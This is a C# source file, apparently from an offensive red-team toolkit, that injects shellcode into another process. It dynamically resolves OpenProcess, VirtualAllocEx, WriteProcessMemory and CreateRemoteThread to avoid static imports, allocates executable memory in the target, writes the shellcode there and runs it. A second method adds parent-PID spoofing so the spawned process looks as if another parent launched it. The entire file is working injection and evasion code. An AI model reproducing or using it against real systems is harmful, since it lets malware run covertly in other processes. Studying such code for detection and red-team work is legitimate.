using System;
using System.Runtime.InteropServices;
using static ProcessInjection.Utils.Utils;
using static ProcessInjection.Native.Enum;
using static ProcessInjection.Native.Structs;
using static ProcessInjection.Native.Delegates;

namespace ProcessInjection.DInvoke
{
    public class DInvokeCreateRemoteThread
    {
        #region DynamicInvoke
        public static void DynamicCodeInject(int pid, byte[] buf)
        {
            uint lpNumberOfBytesWritten = 0;
            uint lpThreadId = 0;

            //var pointer = DynamicInvoke.GetLibraryAddress("kernel32.dll", "CloseHandle");
            //var closehandle = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.CloseHandle)) as DynamicInvoke.CloseHandle;

            try
            {
                PrintInfo($"[+] Obtaining the handle for the process id {pid}.");
                var funcParams = new object[] {
                    (uint)ProcessAccessRights.All,
                    false,
                    (uint)pid
                };

                var pHandle = (IntPtr)DynamicInvoke.DynamicApiInvoke(
                    "kernel32.dll",
                    "OpenProcess",
                    typeof(OpenProcess),
                    ref funcParams,
                    true);

                PrintInfo($"[+] Handle {pHandle} opened for the process id {pid}.");


                PrintInfo($"[+] Allocating memory to inject the shellcode.");

                funcParams = new object[] {
                    pHandle,
                    IntPtr.Zero,
                    (uint)buf.Length,
                    (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE
                };

                var rMemAddress = (IntPtr)DynamicInvoke.DynamicApiInvoke(
                    "kernel32.dll",
                    "VirtualAllocEx",
                    typeof(VirtualAllocEx),
                    ref funcParams,
                    true);

                PrintInfo($"[+] Memory for injecting shellcode allocated at 0x{rMemAddress}.");

                PrintInfo($"[+] Writing the shellcode at the allocated memory location.");

                funcParams = new object[] {
                    pHandle,
                    rMemAddress,
                    buf,
                    (uint)buf.Length,
                    lpNumberOfBytesWritten
                };

                var status = (bool)DynamicInvoke.DynamicApiInvoke(
                    "kernel32.dll",
                    "WriteProcessMemory",
                    typeof(WriteProcessMemory),
                    ref funcParams,
                    true);

                if (status)
                {
                    PrintInfo($"[+] Shellcode written in the process memory.");
                    PrintInfo($"[+] Creating remote thread to execute the shellcode.");

                    funcParams = new object[] {
                    pHandle,
                    IntPtr.Zero,
                    (uint)0,
                    rMemAddress,
                    IntPtr.Zero,
                    (uint)0,
                    (uint)lpThreadId
                    };

                    var hRemoteThread = (IntPtr)DynamicInvoke.DynamicApiInvoke(
                        "kernel32.dll",
                        "CreateRemoteThread",
                        typeof(CreateRemoteThread),
                        ref funcParams,
                        true);

                    PrintSuccess($"[+] Sucessfully injected the shellcode into the memory of the process id {pid}.");
                }
                else
                {
                    PrintError($"[+] Failed to write the shellcode into the memory of the process id {pid}.");
                }

                funcParams = new object[] {
                    pHandle
                    };

                var closed = DynamicInvoke.DynamicApiInvoke(
                    "kernel32.dll",
                    "CloseHandle",
                    typeof(CloseHandle),
                    ref funcParams,
                    true);

            }
            catch (Exception ex)
            {
                PrintError("[+] " + Marshal.GetExceptionCode());
                PrintError(ex.Message);
            }

        }

        public static void PPIDDynCodeInject(string binary, byte[] shellcode, int parentpid)
        {
            DynamicPPIDSpoofing Parent = new DynamicPPIDSpoofing();
            PROCESS_INFORMATION pinf = Parent.DynamicParentSpoofing(parentpid, binary);
            DynamicCodeInject(pinf.dwProcessId, shellcode);



            #endregion DynamicInvoke

        }
    }
}
